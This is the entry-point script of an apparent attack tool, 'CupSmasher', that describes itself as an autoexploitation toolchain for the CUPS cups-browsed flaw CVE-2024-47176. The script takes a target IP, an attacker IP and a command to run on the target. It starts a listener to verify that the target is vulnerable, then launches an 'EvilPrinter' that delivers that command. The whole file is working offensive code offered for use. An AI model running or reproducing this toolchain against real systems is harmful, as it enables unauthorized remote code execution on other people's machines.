# The 2xdropout 2024

import argparse
import threading
import socket
import CVE_2024_47176
import EvilPrinter
import time
import sys

isVulnerable = False


def server(host, port, printerName):
    print("\033[34m[SERVER]\033[37m Starting")

    global isVulnerable

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, int(port)))
    server_socket.listen(1)

    print("\033[34m[SERVER]\033[37m Waiting For Connection...")

    while not isVulnerable:    
        client_connection, client_address = server_socket.accept()

        request = client_connection.recv(1024).decode()
        if(request != None):
            print("\033[34m[SERVER]\033[37m Request Recieved")
        isVulnerable = CVE_2024_47176.verify(request, printerName)

parser = argparse.ArgumentParser(
                    prog='CupSmasher.py',
                    description='Autoexploitation and attack toolchain for CUPS CVE-2024-47176 cups-browsed',
                    epilog='Written with love by The 2xdropout')


parser.add_argument('RHOST', help = 'Target IP')
parser.add_argument('LHOST', help = 'Attacker IP')
parser.add_argument('-c', '--command', required = True, help = 'Command to run on the target | REQUIRED')
parser.add_argument('--RPORT', default = 631, help = 'Target Port | Default:631')
parser.add_argument('--SVRPORT', default = 8080, help = 'Attacker Server Port | Default:8080')
parser.add_argument('--PRTPORT', default = 12345, help = 'Evil Print Server Port | Default:12345')
parser.add_argument('--printer', default = 'The2xprintout', help = 'Set printer name | Default:The2xprintout')
parser.add_argument('--location', default = 'Office', help = 'Set the printer location | Default:Office')
parser.add_argument('--info', default = 'Printer', help = 'Set the printer info | Default:Printer')
parser.add_argument('-T', '--timeout', default = 480, help = "The timeout value to wait for a target response during the verification phase | Default:480")
parser.add_argument('--verifyOnly', default = False, action = 'store_true', help = "Only verify CVE-2024-47176")
parser.add_argument('--autoCheckOff', default = False, action = 'store_true', help = "Disable vulnerability check stage")

args = parser.parse_args()
if not args.autoCheckOff:
    serverThread = threading.Thread(target = server, args = (args.LHOST, args.SVRPORT, args.printer))
    CVE_2024_47176Thread = threading.Thread(target = CVE_2024_47176.initiate, args = (args.RHOST, args.RPORT, args.LHOST, args.SVRPORT, args.printer))

    serverThread.start()
    CVE_2024_47176Thread.start()

    serverThread.join(timeout=int(args.timeout))
    if(not isVulnerable):
        print("\033[34m[SERVER]\033[37m Timeout Value Reached!")
        print("\033[34m[SERVER]\033[37m Target May Not Be Vulnerable!")
        print("\033[32m[CupSmasher]\033[37m Shutting Down...")
        sys.exit()

if not args.verifyOnly:
    EvilPrinter.launch(args.RHOST, args.RPORT, args.LHOST, int(args.PRTPORT), args.printer, args.location, args.info, args.command)  
